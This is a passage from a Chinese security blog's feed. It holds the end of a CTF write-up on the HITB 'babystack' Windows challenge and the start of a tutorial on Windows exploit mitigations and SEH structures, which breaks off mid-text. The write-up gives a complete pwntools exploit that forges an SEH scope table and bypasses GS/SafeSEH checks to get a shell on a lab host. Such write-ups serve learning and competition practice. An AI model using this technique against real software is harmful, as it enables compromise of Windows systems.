table里面的filterFunc和handlerFunc函数，因为程序有后门函数 ， 如果我们想调用这个后门函数，我们需要伪造一个scopetable然后将里面的filterFunc或handlerFunc函数改为后面函数，只要溢出覆盖了以前的scopetable我们就能执行后门函数，这里选择覆盖filterFunc，为什么呢，枪打出头鸟，谁叫它先出来。</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/9.png"></div>**建议为了方便调试，可以将EH4 Stack调转一下，ScopeTable不动，整个图都是上low下high的内存布局。**<p>为了伪造FilterFunc首先我们要知道__security_cookie的值，他是在程序镜像上的，因为程序已经泄露了main地址，所以我们可以根据该地址直接计算出来，然后我们就能伪造Scope Table的地址了。</p><p>但是其还有一个ValidateLocalCookies验证，要求*(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset]的值必须为__security_cookie，通常计算可得该值的地址为stack_addr + 0x68，所以在溢出的时候我们只要提前设置好该值就行。</p><p>我们可以劫持scopeTable地址，我们可以令scopeTable-&gt;GSCookieOffset的值为-2这样就可以绕过部分检查</p><pre class="line-numbers language-python"><code class="language-python">payload  <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xfffffffe</span><span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true"># scopeTable -> GSCookieOffset</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                                 <span class="token comment" spellcheck="true"># scopeTable -> GSCookieXorOffset</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xffffffcc</span><span class="token punctuation">)</span>                       <span class="token comment" spellcheck="true"># scopeTable -> EHCookieOffset</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                                 <span class="token comment" spellcheck="true"># scopeTable -> EHCookieXorOffset</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xfffffffe</span><span class="token punctuation">)</span>                       <span class="token comment" spellcheck="true"># scopeTable -> EncloseingLevel</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>main_address<span class="token operator">+</span><span class="token number">733</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true"># scopeTable -> FilterFunc(backdoor)</span>payload<span class="token operator">+=</span> <span class="token number">0x40</span><span class="token operator">*</span><span class="token string">"a"</span>                             <span class="token comment" spellcheck="true"># stack+0x68</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token punctuation">(</span>stack_addr<span class="token operator">+</span><span class="token number">156</span><span class="token punctuation">)</span><span class="token operator">^</span> security_cookie<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#  GS_Cookie</span>payload<span class="token operator">+=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">32</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>next_addr<span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># next，这里的栈地址也就是第四个参数sehFrame的值</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>main_address<span class="token operator">+</span><span class="token number">944</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># except_handler4，这里就是为了令函数正常进入准备的异常捕获函数</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token punctuation">(</span>stack_addr<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span> security_cookie<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># scopeTable</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">16</span>                                <span class="token comment" spellcheck="true"># framePointer</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>调试过程：</strong></p><p>之前一直没看懂那个图和调试时候栈的内存布局，这下总算搞懂，将SEH stack旋转180度，整个图呈现上low下high就很容易看懂了。</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/10.png"></div>我们看到这里是进入异常处理函数：except_hander4，在里面又会调用except_handler4_common函数，源码如上图所示。我们注意第四个参数sehFrame（上图有误）是我们可以控制的栈地址，由于再后面： scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + 8));是通过这里来获得，所以我们需要在[rbp+c]+8处的地方伪造一个栈地址作为fake scopeTable,在上面的地方我们又对应的伪造scopeTable中的数据，以绕过检查。 <div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/11.png"></div> 如上面代码所示，这个fake scopoTable的值是需要异或securityCookie来获得的，我提前异或用以还原，所以值很奇怪的。<p> <strong>对于后面的ValidateLocalCookies的检查</strong><br> </p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/12.png"></div><br> 我们看到将stack+0x9c作为参数传入，实际上是需要令<br> *(sehFrame+0x10)[-24]^(sehFrame+0x10)==security_cookie<br> 也就是*(stack+0x68)^stack+0x9c = security_cookie<p></p><p> 最后一个问题就是为什么next的值需要stack+0xd4，我看也没有用到啊。找到解释如下：Win10在检查SEH时, 还会检查SEH链, 也就是说, 我们覆盖后的Next需要指向一个正常的SEH, 保证SEH链的正常。好吧，那就这样了吧。</p><h1 id="0x05-exp"><a href="#0x05-exp" class="headerlink" title="0x05 exp"></a>0x05 exp</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'i386'</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'192.168.241.130'</span><span class="token punctuation">,</span> <span class="token number">10009</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_value</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Do you want to know more?'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yes'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Where do you want to know'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'value is '</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'stack address ='</span><span class="token punctuation">)</span>result <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'main address ='</span><span class="token punctuation">)</span>result <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>main_address <span class="token operator">=</span> int<span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'main_address: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>main_address<span class="token punctuation">)</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>security_cookie <span class="token operator">=</span> get_value<span class="token punctuation">(</span>main_address <span class="token operator">+</span> <span class="token number">12116</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'security_cookie: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>security_cookie<span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span>next_addr <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0xd4</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'next_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>next_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload  <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xfffffffe</span><span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true"># scopeTable -> GSCookieOffset</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                                 <span class="token comment" spellcheck="true"># scopeTable -> GSCookieXorOffset</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xffffffcc</span><span class="token punctuation">)</span>                       <span class="token comment" spellcheck="true"># scopeTable -> EHCookieOffset</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                                 <span class="token comment" spellcheck="true"># scopeTable -> EHCookieXorOffset</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xfffffffe</span><span class="token punctuation">)</span>                       <span class="token comment" spellcheck="true"># scopeTable -> EncloseingLevel</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>main_address<span class="token operator">+</span><span class="token number">733</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true"># scopeTable -> FilterFunc(backdoor)</span>payload<span class="token operator">+=</span> <span class="token number">0x40</span><span class="token operator">*</span><span class="token string">"a"</span>                             <span class="token comment" spellcheck="true"># stack+0x68</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token punctuation">(</span>stack_addr<span class="token operator">+</span><span class="token number">156</span><span class="token punctuation">)</span><span class="token operator">^</span> security_cookie<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#  GS_Cookie</span>payload<span class="token operator">+=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">32</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>next_addr<span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># next，这里的栈地址也就是第四个参数sehFrame的值</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>main_address<span class="token operator">+</span><span class="token number">944</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># except_handler4，这里就是为了令函数正常进入准备的异常捕获函数</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token punctuation">(</span>stack_addr<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span> security_cookie<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># scopeTable stack+0x98</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">16</span>                                <span class="token comment" spellcheck="true"># framePointer</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yes'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Where do you want to know'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>贴一张拿到win10 shell的截图：</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/13.png"></div># 0x07 参考文章[Windows Pwn 学习之路](https://www.anquanke.com/post/id/210394#h3-10)[HITB GSEC BABYSTACK — win pwn 初探](http://blog.eonew.cn/archives/1182)<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Windows Pwn从入门到出门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows Pwn </tag>
            
            <tag> SEH-safe绕过 </tag>
            
            <tag> windows栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows-PWN环境搭建&amp;基础知识</title>
      <link href="/2020/08/06/windows-pwn-huan-jing-da-jian-ji-chu-zhi-shi/"/>
      <url>/2020/08/06/windows-pwn-huan-jing-da-jian-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>随队参加了不少比赛，发现pwn题越来越丰富了，人也越来越自闭了，Windows Pwn好像也越来越多了，这里进行总结供今后参考。</p><p>先贴一个winpwn和传统linux下pwn的区别：</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/windows-pwn-huan-jing-da-jian-ji-chu-zhi-shi/0.png"></div><h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>成功的在windbg中调试程序，不过貌似有些问题。然而对于gdb，到最后我也没能在exp中起gdb，尝试过用gdb进行attach，但是执行一阵就退出，且执行过程中无法看到汇编指令，这东西也已经困扰我好几天了，最后只能退一步利用IDA来进行调试了，总不能一直卡在这里，其实IDA也挺不错，至于gdb以后再说吧。环境搭建就不详细说了，因为本人的也不很成功，利用windbg+IDA进行调试。<br>在这里推荐一位师傅的文章：<br><a href="https://binlep.github.io/2020/03/26/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91Windows%20Pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">Windows Pwn环境搭建</a></p><h1 id="0x02-Windows-Pwn基础知识"><a href="#0x02-Windows-Pwn基础知识" class="headerlink" title="0x02 Windows Pwn基础知识"></a>0x02 Windows Pwn基础知识</h1><h2 id="2-1-Windows程序保护机制"><a href="#2-1-Windows程序保护机制" class="headerlink" title="2.1 Windows程序保护机制"></a>2.1 Windows程序保护机制</h2><h3 id="2-1-1-基本保护机制"><a href="#2-1-1-基本保护机制" class="headerlink" title="2.1.1 基本保护机制"></a>2.1.1 基本保护机制</h3><p><strong>ALSR：</strong><br>与Linux相同，地址随机化技术（Address Space Layout Randomization），启动时讲DLL随机的加到内存中。ASLR技术在windows10开始默认启动。</p><p><strong>High Entropy VA：</strong><br>这个保护被称为高熵64位地址空间布局随机化，一旦开启，表示此程序的地址随机化的取值空间为64 bit，这会导致攻击者更难去推测随机化后的地址。</p><p><strong>Force Integrity：</strong><br>这个保护被称为强制签名保护，一旦开启，表示此程序加载时需要验证其中的签名，如果签名不正确，程序将会被阻止运行。</p><p><strong>Isolation：</strong><br>这个保护被称为隔离保护，一旦开启，表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限。</p><p><strong>PAE/NX/DEP：</strong><br>DEP类似Linux下的NX保护机制，这项技术使操作系统能够将一页或多页内存标记为不可执行，从而防止从该内存区域运行代码，以帮助防止利用缓冲区溢出。它帮助防止代码在数据页面(例如堆，栈和内存池)中运行，<strong>在Windows中常称为DEP</strong>(数据执行保护，即Data Execution Prevention)，同时引入了一个新的机制被称为PAE(物理地址扩展，即Physical Address Extension)，<strong>PAE是一项处理器功能，使x86处理器可以在部分Windows版本上访问4 GB以上的物理内存。</strong>在基于x86的系统上运行的<strong>某些32位版本的Windows Server可以使用PAE访问最多64 GB或128 GB的物理内存</strong>，具体取决于处理器的物理地址大小。使用PAE，操作系统将从两级线性地址转换转换为三级地址转换。两级线性地址转换将线性地址拆分为三个独立的字段索引到内存表中，三级地址转换将其拆分为四个独立的字段：一个2位的字段，两个9位的字段和一个12位的字段。PAE模式下的页表条目(PTE)和页目录条目(PDE)的大小从32位增加到64位。附加位允许操作系统PTE或PDE引用4 GB以上的物理内存。同时，PAE将允许在基于x64的系统上运行的32位Windows中启用DEP等功能。</p><p><strong>SEHOP：</strong><br>即结构化异常处理保护(Structured Exception Handling Overwrite Protection)，这个保护能够防止攻击者利用结构化异常处理来进行进一步的利用。</p><p><strong>CFG：</strong><br>即控制流防护(Control Flow Guard)，这项技术通过<strong>在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点</strong>， 最终及时并有效的进行异常处理，避免引发相关的安全问题。简单的说，就是在程序间接跳转之前，会判断这个将要跳转的地址是否是合法的。</p><p><strong>RFG：</strong><br>即返回地址防护(Return Flow Guard)，这项技术会在每个函数头部将返回地址保存到fs:[rsp] (Thread Control Stack)，并在函数返回前将其与栈上返回地址进行比较，从而有效阻止了这些攻击方式。</p><p><strong>SafeSEH：</strong><br>即安全结构化异常处理(Safe Structured Exception Handlers)，这项技术可以理解为一个白名单版的安全沙箱，它会事先为你定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序正式运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行。</p><p><strong>GS：</strong><br>这个保护类似于Linux中的Canary保护，一旦开启，会在返回地址和BP之前压入一个额外的Security Cookie。系统会比较栈中的这个值和原先存放在.data中的值做一个比较。如果两者不吻合，说法栈中发生了溢出。</p><p><strong>Authenticode</strong>：签名保护。</p><p><strong>.NET</strong>：DLL混淆级保护。</p><h3 id="2-2-2-结构化异常处理（SEH机制）"><a href="#2-2-2-结构化异常处理（SEH机制）" class="headerlink" title="2.2.2 结构化异常处理（SEH机制）"></a>2.2.2 结构化异常处理（SEH机制）</h3><h4 id="2-2-2-1-简介"><a href="#2-2-2-1-简介" class="headerlink" title="2.2.2.1 简介"></a>2.2.2.1 简介</h4><p>结构化异常处理是Windows操作系统上Microsoft对C/C++程序语言做的语法扩展，<strong>用于处理异常事件的程序控制结构</strong>。异常事件是指<strong>打断程序正常执行流程的不在期望之中的硬件、软件事件</strong>。</p><p>硬件异常是CPU抛出的如“除0”、数值溢出等；软件异常是操作系统与程序通过RaiseException语句抛出的异常。</p><p>Microsoft扩展了C语言的语法，用try-except与try-finally语句来处理异常。异常处理程序可以释放已经获取的资源、显示出错信息与程序内部状态供调试、从错误中恢复、尝试重新执行出错的代码或者关闭程序等等。一个<strong>try语句不能既有</strong>except，又有__finally。但try-except与try-finally语句可以嵌套使用。</p><h4 id="2-2-2-2-SEH相关的重要结构体："><a href="#2-2-2-2-SEH相关的重要结构体：" class="headerlink" title="2.2.2.2 SEH相关的重要结构体："></a>2.2.2.2 SEH相关的重要结构体：</h4><p>TIB结构体TIB(Thread Information Block，线程信息块)是<strong>保存线程基本信息的数据结构，</strong>它存在于x86的机器上，它也被称为是Win32的TEB(Thread Environment Block，线程环境块)。TIB/TEB是操作系统为了保存每个线程的私有数据创建的，每个线程都有自己的TIB/TEB。</p><p><strong>TEB结构位于Windows.h，内容如下：</strong></p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _TEB<span class="token punctuation">{</span>     PVOID Reserved1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     PPEB ProcessEnvironmentBlock<span class="token punctuation">;</span>     PVOID Reserved2<span class="token punctuation">[</span><span class="token number">399</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     BYTE Reserved3<span class="token punctuation">[</span><span class="token number">1952</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     PVOID TlsSlots<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     BYTE Reserved4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     PVOID Reserved5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     PVOID ReservedForOle<span class="token punctuation">;</span>     PVOID Reserved6<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     PVOID TlsExpansionSlots<span class="token punctuation">;</span> <span class="token punctuation">}</span> TEB<span class="token punctuation">,</span> <span class="token operator">*</span>PTEB<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>线程信息块TIB（Thread Information Block或TEB）：</strong></p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _NT_TIB<span class="token punctuation">{</span>     <span class="token keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD <span class="token operator">*</span>Exceptionlist<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 指向当前线程的 SEH </span>    PVOID StackBase<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 当前线程所使用的栈的栈底 </span>    PVOID StackLimit<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 当前线程所使用的栈的栈顶 </span>    PVOID SubSystemTib<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 子系统 </span>    <span class="token keyword">union</span> <span class="token punctuation">{</span>         PVOID FiberData<span class="token punctuation">;</span>         ULONG Version<span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">;</span>     PVOID ArbitraryUserPointer<span class="token punctuation">;</span>     <span class="token keyword">struct</span> _NT_TIB <span class="token operator">*</span>Self<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//指向TIB结构自身 </span><span class="token punctuation">}</span> NT_TIB<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Fs:[0]总是指向当前线程的TIB，其中0偏移的指向线程的异常链表，即ExceptionList是指向异常处理链表（EXCEPTION_REGISTRATION结构）的一个指针。</p><p><strong>_EXCEPTION_REGISTRATION_RECORD结构体：</strong></p><p>该结构体主要用于描述线程异常处理句柄的地址，多个该结构的链表描述了多个线程异常处理过程的嵌套层次关系。结构体内容：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Code in https://source.winehq.org/source/include/winnt.h#2623 </span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD<span class="token punctuation">{</span>     <span class="token keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD <span class="token operator">*</span>Next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 指向下一个结构的指针 </span>    PEXCEPTION_ROUTINE Handler<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 当前异常处理回调函数的地址 </span><span class="token punctuation">}</span>EXCEPTION_REGISTRATION_RECORD<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-2-3-线程异常处理"><a href="#2-2-2-3-线程异常处理" class="headerlink" title="2.2.2.3 线程异常处理"></a>2.2.2.3 线程异常处理</h4><h5 id="2-2-2-3-1-线程异常处理特点"><a href="#2-2-2-3-1-线程异常处理特点" class="headerlink" title="2.2.2.3.1 线程异常处理特点"></a>2.2.2.3.1 线程异常处理特点</h5><p>①Windows系统为每个线程单独提供了一种异常处理的方法，当一个线程出现错误时，操作系统调用用户定义的一系列回调函数，在这些回调函数中，可以进行修复错误或其它的一些操作，最后的返回值告系统系统下一步的动作（如继续搜索异常处理程序或终止程序等）。　　<br>②SEH是基于线程的，使用SEH可以为每个线程设置不同的异常处理程序（回调函数）而且可以为每个线程设置多个异常处理程序。　　<br>③ 由于SEH使用了与硬件平台相关的数据指针，所以不同硬件平台使用SHE的方法有所不同。</p><h5 id="2-2-2-3-2-回调函数原型"><a href="#2-2-2-3-2-回调函数原型" class="headerlink" title="2.2.2.3.2 回调函数原型"></a>2.2.2.3.2 回调函数原型</h5><pre class="line-numbers language-c"><code class="language-c">EXCEPTION_DISPOSITION __cdecl <span class="token function">_except_handler</span><span class="token punctuation">(</span>     <span class="token keyword">struct</span> _EXCEPTION_RECORD <span class="token operator">*</span>ExceptionRecord<span class="token punctuation">,</span><span class="token comment" spellcheck="true">//指向包含异常信息的EXCEPTION_RECORD结构</span>     <span class="token keyword">void</span><span class="token operator">*</span> EstablisherFrame<span class="token punctuation">,</span><span class="token comment" spellcheck="true">//指向该异常相关的EXCEPTION_REGISTRATION结构</span>     <span class="token keyword">struct</span> _CONTEXT <span class="token operator">*</span>ContextRecord<span class="token punctuation">,</span><span class="token comment" spellcheck="true">//指向线程环境CONTEXT结构的指针</span>     <span class="token keyword">void</span><span class="token operator">*</span> DispatcherContext<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//该域暂无意义</span>     ……    <span class="token comment" spellcheck="true">//4种返回值及含义</span>    <span class="token comment" spellcheck="true">//1.ExceptionContinueExecution(0)：回调函数处理了异常，可以从异常发生的指令处重新执行。</span>    <span class="token comment" spellcheck="true">//2.ExceptionContinueSearch(1)：回调函数不能处理该异常，需要要SEH链中的其他回调函数处理。</span>    <span class="token comment" spellcheck="true">//3.ExceptionNestedException(2)：回调函数在执行中又发生了新的异常，即发生了嵌套异常</span>    <span class="token comment" spellcheck="true">//4.ExceptionCollidedUnwind(3)：发生了嵌套的展开操作</span>    <span class="token keyword">return</span> …<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="2-2-2-3-3-注册异常回调"><a href="#2-2-2-3-3-注册异常回调" class="headerlink" title="2.2.2.3.3 注册异常回调"></a>2.2.2.3.3 注册异常回调</h5><pre class="line-numbers language-c"><code class="language-c">push _exception_handler <span class="token comment" spellcheck="true">//异常回调函数_exception_handler的地址，即handler</span>push fs<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>             <span class="token comment" spellcheck="true">//保存前一个异常回调函数的地址，即prev</span>mov fs<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>esp          <span class="token comment" spellcheck="true">//安装新的EXCEPTION_REGISTRATION结构（两个成员:prev,handler）。</span>                        <span class="token comment" spellcheck="true">//此时栈顶分别是prev和handler，为新的EXCEPTION_REGISTRATION结</span>                        <span class="token comment" spellcheck="true">//构，mov fs:[0],esp，就可以让fs:[0]指向该指构。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="2-2-2-3-4-异常回调函数的调用过程"><a href="#2-2-2-3-4-异常回调函数的调用过程" class="headerlink" title="2.2.2.3.4 异常回调函数的调用过程"></a>2.2.2.3.4 异常回调函数的调用过程</h5><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 